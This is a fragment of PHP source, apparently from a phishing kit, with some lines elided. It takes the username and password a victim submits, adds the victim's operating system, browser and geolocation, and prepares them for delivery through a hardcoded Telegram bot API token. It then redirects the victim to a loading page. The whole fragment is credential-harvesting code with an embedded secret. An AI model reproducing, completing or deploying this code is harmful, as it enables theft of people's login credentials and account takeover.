...
@$pais = $mjdeta['geoplugin_countryName']; 
...
$message = "Usuario: ".$_POST['usu']." - Clave: ".$_POST['pass']." \r\n";
$message .= " SO= ".$user_os." ".$navegador." ".$userp." ".$pais." ".$region." ".$ciudad."\r\n";
$apiToken = "5687953028:AAG87tsBDM3rQwodFQaleX482XwRNbQ-pVQ";
...
}else{ header ('location: cargar.html'); exit();
 }
